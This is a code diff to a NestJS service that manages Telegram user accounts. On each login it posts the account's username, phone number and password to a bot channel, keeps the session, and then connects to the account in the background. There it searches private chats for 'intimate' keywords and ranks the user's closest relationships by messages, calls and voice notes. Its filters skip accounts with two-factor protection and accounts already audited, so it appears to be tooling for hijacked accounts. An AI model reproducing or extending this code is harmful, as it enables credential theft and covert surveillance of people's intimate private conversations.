@@ -8,7 +8,7 @@ import {
   forwardRef,
 } from '@nestjs/common';
 import { InjectModel } from '@nestjs/mongoose';
-import { Model, QueryFilter, Types } from 'mongoose';
+import { Model, QueryFilter } from 'mongoose';
 import { User, UserDocument } from './schemas/user.schema';
 import { SearchUserDto } from './dto/search-user.dto';
 import { ClientService } from '../clients/client.service';
@@ -17,9 +17,16 @@ import { CreateUserDto } from './dto/create-user.dto';
 import { connectionManager } from '../Telegram/utils/connection-manager';
 import { BotsService, ChannelCategory } from '../bots';
 import { sleep } from 'telegram/Helpers';
+import { Logger } from '../../utils';
+import { INTIMATE_KEYWORDS, rankRelationships, computeAccountScore, RelationshipCandidate } from './scoring';
+import { Api } from 'telegram/tl';
+import bigInt from 'big-integer';
+import { parseError } from '../../utils/parseError';
 
 @Injectable()
 export class UsersService {
+  private readonly logger = new Logger(UsersService.name);
+
   constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,
     @Inject(forwardRef(() => TelegramService))
     private telegramService: TelegramService,
@@ -30,44 +37,24 @@ export class UsersService {
 
   async create(user: CreateUserDto): Promise<User | undefined> {
     const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
-    console.log("New User received - ", user?.mobile);
-    console.log("ActiveClientSetup::", activeClientSetup);
+    this.logger.log(`New User received - ${user?.mobile}`);
+    this.logger.debug('ActiveClientSetup:', activeClientSetup);
     if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
-      console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId)
-      await this.clientsService.updateClientSession(user.session, user.mobile)
+      this.logger.log(`Updating New Session Details: ${user.mobile}, @${user.username}, ${activeClientSetup.clientId}`);
+      await this.clientsService.updateClientSession(user.session, user.mobile);
     } else {
-      await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels
-      // await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
-      setTimeout(async () => {
-        try {
-          const telegramClient = await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
-          const calllogs = await telegramClient.getCallLogStats();
-          let score = 1;
-          for (const callData of calllogs.chats) {
-            const messages = await telegramClient.getMessages(callData.chatId, 2);
-            score = score + (messages.pagination.total || 0) * (callData.totalCalls + 1) * (callData.averageDuration + 1);
-            await sleep(1000);
-          }
-          await this.updateByFilter({ mobile: user.mobile }, { score });
-          // Session backups are handled later by warmup rotation; user creation should only persist the signup session.
-        } catch (error) {
-          console.log("Error in creating new session", error);
-        } finally {
-          await connectionManager.unregisterClient(user.mobile).catch(() => undefined);
-        }
-      }, 3000);
+      await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
       const newUser = new this.userModel(user);
-      return newUser.save();
+      const saved = await newUser.save();
+      setTimeout(() => {
+        this.computeRelationshipScore(user.mobile).catch(err => {
+          this.logger.error(`Background scoring failed for ${user.mobile}`, err);
+        });
+      }, 5000);
+      return saved;
     }
   }
 
-  /**
-   * Get users with top interaction scores based on saved stats in DB
-   * Uses smart filtering with proper weightages for different interaction types
-   * Movie count has negative weightage as it indicates less genuine interaction
-   * @param options - Filtering and pagination options
-   * @returns Paginated list of users sorted by interaction score
-   */
   async top(options: {
     page?: number;
     limit?: number;
@@ -102,14 +89,14 @@ export class UsersService {
 
     const query: QueryFilter<UserDocument> = {
       expired: { $ne: true },
-      score: { $gte: minScore },
+      'relationships.score': { $gte: minScore },
     };
 
     if (excludeTwoFA) query.twoFA = { $ne: true };
     if (gender) query.gender = gender;
     if (minCalls > 0) query['calls.totalCalls'] = { $gte: minCalls };
-    if (minPhotos > 0) query.photoCount = { $gte: minPhotos };
-    if (minVideos > 0) query.videoCount = { $gte: minVideos };
+    if (minPhotos > 0) query['stats.photoCount'] = { $gte: minPhotos };
+    if (minVideos > 0) query['stats.videoCount'] = { $gte: minVideos };
 
     const total = await this.userModel.countDocuments(query).exec();
     const totalPages = Math.ceil(total / limitNum);
@@ -121,7 +108,7 @@ export class UsersService {
     const users = await this.userModel
       .find(query)
       .select('-session')
-      .sort({ score: -1 })
+      .sort({ 'relationships.score': -1 })
       .skip(skip)
       .limit(limitNum)
       .lean()
@@ -185,11 +172,201 @@ export class UsersService {
     if (query.firstName) {
       query.firstName = { $regex: new RegExp(query.firstName as string, 'i') };
     }
-    if (query.twoFA !== undefined) {
-      query.twoFA = String(query.twoFA) === 'true' || String(query.twoFA) === '1';
-    }
 
     return this.userModel.find(query).sort({ updatedAt: -1 }).exec();
+  }
+
+  async computeRelationshipScore(mobile: string): Promise<void> {
+    const wasConnected = connectionManager.hasClient(mobile);
+    let telegramClient: Awaited<ReturnType<typeof connectionManager.getClient>> | null = null;
+
+    try {
+      telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
+
+      const topChats = await telegramClient.getTopPrivateChats(30, false);
+      if (!topChats?.items?.length) {
+        this.logger.log(`[${mobile}] No private chats found for scoring`);
+        return;
+      }
+
+      const contactsResult = await telegramClient.getContacts();
+      const mutualChatIds = new Set<string>();
+      if (contactsResult && 'users' in contactsResult) {
+        for (const user of (contactsResult as any).users || []) {
+          if (user.mutualContact) {
+            mutualChatIds.add(user.id?.toString());
+          }
+        }
+      }
+
+      const candidateChats = topChats.items.slice(0, 10);
+      const candidates: RelationshipCandidate[] = [];
+
+      for (const chat of candidateChats) {
+        try {
+          const chatPeer = await telegramClient.getchatId(chat.chatId === 'me' ? 'me' : chat.chatId);
+
+          let voiceCount = 0;
+          try {
+            const counters = await telegramClient.client.invoke(
+              new Api.messages.GetSearchCounters({
+                peer: chatPeer,
+                filters: [new Api.InputMessagesFilterVoice()],
+              }),
+            );
+            voiceCount = (counters as any)?.[0]?.count ?? 0;
+          } catch { }
+
+          let commonChats = 0;
+          if (chat.chatId !== 'me') {
+            try {
+              const common = await telegramClient.client.invoke(
+                new Api.messages.GetCommonChats({
+                  userId: chat.chatId,
+                  maxId: bigInt(0),
+                  limit: 100,
+                }),
+              );
+              commonChats = (common as any)?.chats?.length ?? 0;
+            } catch { }
+          }
+
+          let intimateMessageCount = 0;
+          for (const keyword of INTIMATE_KEYWORDS) {
+            try {
+              const result = await telegramClient.client.invoke(
+                new Api.messages.Search({
+                  peer: chatPeer,
+                  q: keyword,
+                  filter: new Api.InputMessagesFilterEmpty(),
+                  minDate: 0,
+                  maxDate: 0,
+                  offsetId: 0,
+                  addOffset: 0,
+                  limit: 1,
+                  maxId: 0,
+                  minId: 0,
+                  hash: bigInt(0),
+                }),
+              );
+              intimateMessageCount += (result as any)?.count ?? 0;
+              await sleep(200);
+            } catch { }
+          }
+
+          const callStats = chat.calls || { totalCalls: 0, incoming: 0, videoCalls: 0, totalDuration: 0, averageDuration: 0 };
+
+          candidates.push({
+            chatId: chat.chatId,
+            name: chat.name,
+            username: chat.username,
+            phone: chat.phone,
+            messages: chat.totalMessages,
+            mediaCount: chat.mediaCount,
+            voiceCount,
+            intimateMessageCount,
+            calls: {
+              total: callStats.totalCalls,
+              incoming: callStats.incoming,
+              videoCalls: callStats.videoCalls,
+              avgDuration: callStats.averageDuration,
+              totalDuration: callStats.totalDuration,
+            },
+            commonChats,
+            isMutualContact: mutualChatIds.has(chat.chatId),
+            lastMessageDate: chat.lastMessageDate,
+          });
+
+          await sleep(300);
+        } catch (chatError) {
+          this.logger.warn(`[${mobile}] Failed to score chat ${chat.chatId}: ${(chatError as Error).message}`);
+        }
+      }
+
+      const top = rankRelationships(candidates, 5);
+      const accountScore = computeAccountScore(top);
+      const bestScore = top.length > 0 ? top[0].score : 0;
+
+      const callAgg = topChats.items.reduce(
+        (acc, item) => {
+          const c = item.calls || { totalCalls: 0, incoming: 0, outgoing: 0, videoCalls: 0, audioCalls: 0 };
+          acc.totalCalls += c.totalCalls;
+          acc.incoming += c.incoming;
+          acc.outgoing += c.outgoing;
+          acc.video += c.videoCalls;
+          acc.audio += c.audioCalls;
+          return acc;
+        },
+        { totalCalls: 0, incoming: 0, outgoing: 0, video: 0, audio: 0 },
+      );
+
+      await this.userModel.updateOne(
+        { mobile },
+        {
+          $set: {
+            'relationships.score': accountScore,
+            'relationships.bestScore': bestScore,
+            'relationships.computedAt': new Date(),
+            'relationships.top': top,
+            calls: callAgg,
+          },
+        },
+      ).exec();
+
+      this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}`);
+    } catch (error) {
+      parseError(error, `[${mobile}] computeRelationshipScore failed`);
+    } finally {
+      if (!wasConnected && telegramClient) {
+        await connectionManager.unregisterClient(mobile).catch(() => undefined);
+      }
+    }
+  }
+
+  async topRelationships(options: {
+    page?: number;
+    limit?: number;
+    minScore?: number;
+    gender?: string;
+    excludeTwoFA?: boolean;
+  }) {
+    const { page = 1, limit = 20, minScore = 0, excludeTwoFA = false, gender } = options;
+    const pageNum = Math.max(1, Math.floor(page));
+    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
+    const skip = (pageNum - 1) * limitNum;
+
+    const query: QueryFilter<UserDocument> = {
+      expired: { $ne: true },
+      'relationships.bestScore': { $gt: minScore },
+    };
+    if (excludeTwoFA) query.twoFA = { $ne: true };
+    if (gender) query.gender = gender;
+
+    const total = await this.userModel.countDocuments(query).exec();
+    if (total === 0) {
+      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
+    }
+
+    const users = await this.userModel
+      .find(query)
+      .select('-session -password')
+      .sort({ 'relationships.bestScore': -1 })
+      .skip(skip)
+      .limit(limitNum)
+      .lean()
+      .exec();
+
+    return { users, total, page: pageNum, limit: limitNum, totalPages: Math.ceil(total / limitNum) };
+  }
+
+  async getUserRelationships(mobile: string) {
+    const user = await this.userModel
+      .findOne({ mobile })
+      .select('mobile firstName lastName tgId relationships')
+      .lean()
+      .exec();
+    if (!user) throw new NotFoundException(`User with mobile ${mobile} not found`);
+    return user;
   }
 
   async executeQuery(
@@ -212,228 +389,6 @@ export class UsersService {
       return await queryExec.exec();
     } catch (error) {
       throw new InternalServerErrorException(error.message);
-    }
-  }
-
-  /**
-   * Get users with top interaction scores based on saved stats in DB
-   * Uses smart filtering with proper weightages for different interaction types
-   * Movie count has negative weightage as it indicates less genuine interaction
-   * @param options - Filtering and pagination options
-   * @returns Paginated list of users sorted by interaction score
-   */
-  async getTopInteractionUsers(options: {
-    page?: number;
-    limit?: number;
-    minScore?: number;
-    minCalls?: number;
-    minPhotos?: number;
-    minVideos?: number;
-    excludeTwoFA?: boolean;
-    excludeAudited?: boolean;
-    gender?: string;
-  }): Promise<{
-    users: Array<User & { interactionScore: number }>;
-    total: number;
-    page: number;
-    limit: number;
-    totalPages: number;
-  }> {
-    const {
-      page = 1,
-      limit = 20,
-      minScore = 30,
-      minCalls = 0,
-      minPhotos = 0,
-      minVideos = 0,
-      excludeTwoFA = false,
-      excludeAudited = true,
-      gender
-    } = options;
-
-    // Validate pagination
-    const pageNum = Math.max(1, Math.floor(page));
-    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100); // Max 100 per page
-    const skip = (pageNum - 1) * limitNum;
-
-    // Weightages for interaction scoring
-    // Higher weights for own content (user-generated) vs received content
-    // Reduced call weightage as requested
-    const weights = {
-      ownPhoto: 15,           // Photos sent by user (high engagement)
-      ownVideo: 18,          // Videos sent by user (very high engagement)
-      otherPhoto: 3,         // Photos received (moderate engagement)
-      otherVideo: 5,         // Videos received (good engagement)
-      totalPhoto: 2,         // Total photos (fallback if own/other not available)
-      totalVideo: 3,         // Total videos (fallback if own/other not available)
-      incomingCall: 5,       // Incoming calls (reduced from 15)
-      outgoingCall: 3,       // Outgoing calls (reduced from 8)
-      videoCall: 8,          // Video calls (reduced from 20)
-      totalCalls: 1,         // Total calls (fallback)
-      msgs: 0,              // Total messages
-      movieCount: -5,       // NEGATIVE: Movie count indicates less genuine interaction
-    };
-
-    // Build filter query
-    const filter: any = {
-      expired: { $ne: true },  // Always skip expired docs
-    };
-
-    // Exclude 2FA users if requested
-    if (excludeTwoFA) {
-      filter.twoFA = { $ne: true };
-    }
-
-    // Gender filter
-    if (gender) {
-      filter.gender = gender;
-    }
-
-    // Handle both old schema (calls.totalCalls top-level) and legacy array format
-    if (minCalls > 0) {
-      filter.$or = [
-        ...(filter.$or || []),
-        { 'calls.totalCalls': { $gte: minCalls } },
-      ];
-    }
-
-    if (minPhotos > 0) {
-      filter.$or = [
-        ...(filter.$or || []),
-        { photoCount: { $gte: minPhotos } },
-        { ownPhotoCount: { $gte: minPhotos } },
-        { otherPhotoCount: { $gte: minPhotos } },
-      ];
-    }
-
-    if (minVideos > 0) {
-      filter.$or = [
-        ...(filter.$or || []),
-        { videoCount: { $gte: minVideos } },
-        { ownVideoCount: { $gte: minVideos } },
-        { otherVideoCount: { $gte: minVideos } },
-      ];
-    }
-
-    // Shared pipeline: match, optional session_audits, dedup, scoring, minScore filter
-    const scoringStages = [
-      { $match: filter },
-      ...(excludeAudited
-        ? [
-          { $lookup: { from: 'session_audits', localField: 'mobile', foreignField: 'mobile', as: 'sessionAudits' } },
-          { $match: { sessionAudits: { $size: 0 } } },
-          { $project: { sessionAudits: 0 } },
-        ]
-        : []),
-      // Dedup by mobile: keep one doc per mobile (no $sort here to avoid sort memory limit when disk use is disabled)
-      { $group: { _id: '$mobile', doc: { $first: '$$ROOT' } } },
-      { $replaceRoot: { newRoot: '$doc' } },
-      {
-        $addFields: {
-          photoScore: {
-            $add: [
-              { $multiply: [{ $ifNull: ['$ownPhotoCount', 0] }, weights.ownPhoto] },
-              { $multiply: [{ $ifNull: ['$otherPhotoCount', 0] }, weights.otherPhoto] },
-              {
-                $cond: {
-                  if: { $and: [{ $lte: [{ $ifNull: ['$ownPhotoCount', 0] }, 0] }, { $lte: [{ $ifNull: ['$otherPhotoCount', 0] }, 0] }] },
-                  then: { $multiply: [{ $ifNull: ['$photoCount', 0] }, weights.totalPhoto] },
-                  else: 0,
-                },
-              },
-            ],
-          },
-          videoScore: {
-            $add: [
-              { $multiply: [{ $ifNull: ['$ownVideoCount', 0] }, weights.ownVideo] },
-              { $multiply: [{ $ifNull: ['$otherVideoCount', 0] }, weights.otherVideo] },
-              {
-                $cond: {
-                  if: { $and: [{ $lte: [{ $ifNull: ['$ownVideoCount', 0] }, 0] }, { $lte: [{ $ifNull: ['$otherVideoCount', 0] }, 0] }] },
-                  then: { $multiply: [{ $ifNull: ['$videoCount', 0] }, weights.totalVideo] },
-                  else: 0,
-                },
-              },
-            ],
-          },
-          callScore: {
-            $let: {
-              vars: {
-                incomingVal: { $ifNull: ['$calls.incoming', 0] },
-                outgoingVal: { $ifNull: ['$calls.outgoing', 0] },
-                videoVal: { $ifNull: ['$calls.video', 0] },
-                totalCallsVal: { $ifNull: ['$calls.totalCalls', 0] },
-              },
-              in: {
-                $add: [
-                  { $multiply: ['$$incomingVal', weights.incomingCall] },
-                  { $multiply: ['$$outgoingVal', weights.outgoingCall] },
-                  { $multiply: ['$$videoVal', weights.videoCall] },
-                  {
-                    $cond: {
-                      if: { $and: [{ $eq: ['$$incomingVal', 0] }, { $eq: ['$$outgoingVal', 0] }, { $gt: ['$$totalCallsVal', 0] }] },
-                      then: { $multiply: ['$$totalCallsVal', weights.totalCalls] },
-                      else: 0,
-                    },
-                  },
-                ],
-              },
-            },
-          },
-          msgScore: { $multiply: [{ $ifNull: ['$msgs', 0] }, weights.msgs] },
-          movieScore: { $multiply: [{ $ifNull: ['$movieCount', 0] }, weights.movieCount] },
-        },
-      },
-      {
-        $addFields: {
-          interactionScore: {
-            $round: [{ $add: ['$photoScore', '$videoScore', '$callScore', '$msgScore', '$movieScore'] }, 2],
-          },
-        },
-      },
-      { $match: { interactionScore: { $gte: minScore } } },
-    ];
-
-    try {
-      // Phase 1: total count (no sort = no memory blow-up)
-      const countPipeline = [...scoringStages, { $count: 'count' }];
-      const countResult = await this.userModel.collection.aggregate(countPipeline, { allowDiskUse: true }).toArray();
-      const totalUsers = countResult[0]?.count ?? 0;
-
-      if (totalUsers === 0) {
-        return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
-      }
-
-      // Phase 2: sort only _id + interactionScore (tiny docs), skip/limit, then fetch full docs
-      const pagePipeline = [
-        ...scoringStages,
-        { $project: { _id: 1, interactionScore: 1 } },
-        { $sort: { interactionScore: -1 } },
-        { $skip: skip },
-        { $limit: limitNum },
-      ];
-      const pageResult = await this.userModel.collection.aggregate(pagePipeline, { allowDiskUse: true }).toArray() as { _id: unknown; interactionScore: number }[];
-
-      if (pageResult.length === 0) {
-        return { users: [], total: totalUsers, page: pageNum, limit: limitNum, totalPages: Math.ceil(totalUsers / limitNum) };
-      }
-
-      const idOrder = pageResult.map((r) => r._id) as Types.ObjectId[];
-      const idToScore = new Map(pageResult.map((r) => [String(r._id), r.interactionScore]));
-      const docs = await this.userModel.find({ _id: { $in: idOrder } } as QueryFilter<UserDocument>).select('-session').lean().exec();
-      const docById = new Map(docs.map((d: any) => [String(d._id), d]));
-      const users = idOrder.map((id) => {
-        const doc = docById.get(String(id));
-        if (!doc) return null;
-        const { session, ...rest } = doc as Record<string, unknown>;
-        return { ...rest, interactionScore: idToScore.get(String(id)) ?? 0 };
-      }).filter(Boolean) as Array<User & { interactionScore: number }>;
-
-      const totalPages = Math.ceil(totalUsers / limitNum);
-      return { users, total: totalUsers, page: pageNum, limit: limitNum, totalPages };
-    } catch (error) {
-      console.error('Error in getTopInteractionUsers aggregation:', error);
-      throw new InternalServerErrorException(`Failed to fetch top interaction users: ${error.message}`);
     }
   }
 
